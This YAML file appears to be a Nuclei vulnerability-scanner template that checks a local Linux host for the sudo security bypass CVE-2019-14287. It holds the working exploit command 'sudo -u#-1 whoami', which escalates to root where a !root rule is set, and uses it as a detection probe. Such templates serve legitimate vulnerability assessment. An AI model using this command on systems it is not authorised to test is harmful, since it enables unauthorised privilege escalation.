code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  matchers:
  - condition: and
    dsl:
    - '!contains(code_1_response, "root")'
    - contains(code_2_response, "root")
    type: dsl
  source: 'sudo -u#-1 whoami

    '
id: CVE-2019-14287
info:
  author: daffainfo
  description: 'In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer
    account can bypass certain policy blacklists and session PAM modules, and can
    cause incorrect logging, by invoking sudo with a crafted user ID. For example,
    this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))"
    command.

    '
  metadata:
    max-request: 2
    product: ubuntu_linux
    vendor: canonical
    verified: true
  name: Sudo <= 1.8.27 - Security Bypass
  reference:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287
  - https://www.exploit-db.com/exploits/47502
  severity: high
  tags: cve,cve2019,sudo,code,linux,privesc,local,canonical
self-contained: true
